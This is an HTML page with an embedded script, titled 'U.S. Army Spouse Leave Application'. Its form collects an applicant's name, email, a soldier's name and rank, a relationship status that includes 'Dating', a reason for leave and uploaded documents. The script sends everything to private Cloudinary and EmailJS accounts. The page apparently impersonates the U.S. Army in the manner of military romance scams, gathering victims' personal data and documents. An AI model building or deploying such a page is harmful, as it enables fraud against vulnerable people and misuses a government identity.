<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>U.S. Army Spouse Leave Application</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("gemkywkuPgyAvxdHD");

    async function uploadToCloudinary(file) {
      const formData = new FormData();
      formData.append("file", file);
      formData.append("upload_preset", "unsigned_preset");

      const response = await fetch("https://api.cloudinary.com/v1_1/do9yjpizs/auto/upload", {
        method: "POST",
        body: formData,
      });

      if (!response.ok) throw new Error("Upload failed");
      const data = await response.json();
      return data.secure_url;
    }

    async function handleSubmit(event) {
      event.preventDefault();
      const form = document.getElementById("leaveForm");
      const formData = new FormData(form);
      const file = formData.get("docs");

      try {
        const fileUrl = await uploadToCloudinary(file);

        const templateParams = {
          name: formData.get("name"),
          email: formData.get("email"),
          rank: formData.get("rank"),
          relationship: formData.get("relationship"),
          reason: formData.get("reason"),
          file_url: fileUrl
        };

        await emailjs.send("service_il4m6rr", "template_0moxpwa", templateParams);
        await emailjs.send("service_il4m6rr", "template_3tmdj1g", templateParams);

        alert("Application submitted successfully. Confirmation has been emailed.");
        form.reset();
      } catch (error) {
        console.error("Error:", error);
        alert("There was an error submitting your application. Please try again.");
      }
    }
  </script>
  <style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
    .army-gold { background-color: #ffcc00; color: #1a1a1a; }
    .army-gold-text { color: #ffcc00; }
    .border-army { border-color: #ffcc00; }
  </style>
</head>
<body class="bg-gray-100 text-gray-800">
  <!-- Keep all your header and sections above unchanged -->

  <!-- Leave Application Form -->
  <section id="application" class="mt-16 bg-white p-8 rounded-2xl shadow-md">
    <h2 class="text-2xl font-bold mb-6">Leave Application Form</h2>
    <form id="leaveForm" class="grid gap-4" onsubmit="handleSubmit(event)">
      <label>Full Name
        <input name="name" class="mt-1 p-3 w-full border border-army rounded-lg" type="text" required />
      </label>
      <label>Email Address
        <input name="email" class="mt-1 p-3 w-full border border-army rounded-lg" type="email" required />
      </label>
      <label>Soldier’s Full Name & Rank
        <input name="rank" class="mt-1 p-3 w-full border border-army rounded-lg" type="text" required />
      </label>
      <label>Relationship Type
        <select name="relationship" class="mt-1 p-3 w-full border border-army rounded-lg" required>
          <option value="Married">Married</option>
          <option value="Dating">Dating</option>
          <option value="Fiancé(e)">Fiancé(e)</option>
        </select>
      </label>
      <label>Reason for Leave
        <textarea name="reason" class="mt-1 p-3 w-full border border-army rounded-lg" rows="4" required></textarea>
      </label>
      <label>Upload Supporting Documents
        <input name="docs" class="mt-1 p-3 w-full border border-army rounded-lg" type="file" accept=".pdf,.jpg,.png" required />
      </label>
      <button type="submit" class="bg-black text-white font-semibold py-3 px-6 rounded-lg hover:bg-gray-900 transition">Submit Request</button>
    </form>
  </section>

  <!-- Contact Section and Footer remain unchanged -->
</body>
</html>
